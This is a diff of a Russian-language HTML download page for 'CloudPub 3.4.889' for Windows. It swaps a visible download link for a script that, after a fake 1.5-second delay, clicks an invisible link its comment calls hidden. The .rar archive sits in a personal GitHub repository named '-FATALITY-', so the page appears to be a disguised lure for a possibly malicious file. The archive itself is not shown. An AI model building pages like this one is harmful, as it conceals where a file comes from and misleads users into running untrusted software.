@@ -139,6 +139,25 @@
             transform: translateY(0);
         }
 
+        /* Индикатор загрузки */
+        .loading-text {
+            display: none;
+            color: #6c5ce7;
+            font-size: 14px;
+            margin-top: 15px;
+            letter-spacing: 1px;
+        }
+
+        .loading-text.active {
+            display: block;
+            animation: pulse 1s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
         /* Футер */
         .footer {
             text-align: center;
@@ -175,14 +194,41 @@
             <div class="file-name">cloudpub-3.4.889-stable-windows-x86_64.rar</div>
             <div class="file-meta">Версия 3.4.889 • Windows x64 • 15.6 MB</div>
 
-            <a href="https://raw.githubusercontent.com/WENerty1337/-FATALITY-/main/cloudpub-3.4.889-stable-windows-x86_64.rar" class="download-btn">
+            <button class="download-btn" onclick="startDownload()">
                 ⬇️ Скачать
-            </a>
+            </button>
+            <div class="loading-text" id="loadingText">Подготовка загрузки...</div>
         </div>
 
         <div class="footer">
             CloudPub © 2026
         </div>
     </div>
+
+    <script>
+        function startDownload() {
+            // Показываем индикатор загрузки
+            const loadingText = document.getElementById('loadingText');
+            loadingText.classList.add('active');
+            
+            // Имитация задержки перед скачиванием
+            setTimeout(() => {
+                // Скрытая ссылка на файл
+                const fileUrl = 'https://raw.githubusercontent.com/WENerty1337/-FATALITY-/main/cloudpub-3.4.889-stable-windows-x86_64.rar';
+                
+                // Создаем невидимую ссылку и кликаем по ней
+                const link = document.createElement('a');
+                link.href = fileUrl;
+                link.download = 'cloudpub-3.4.889-stable-windows-x86_64.rar';
+                link.style.display = 'none';
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+                
+                // Скрываем индикатор
+                loadingText.classList.remove('active');
+            }, 1500);
+        }
+    </script>
 </body>
 </html>
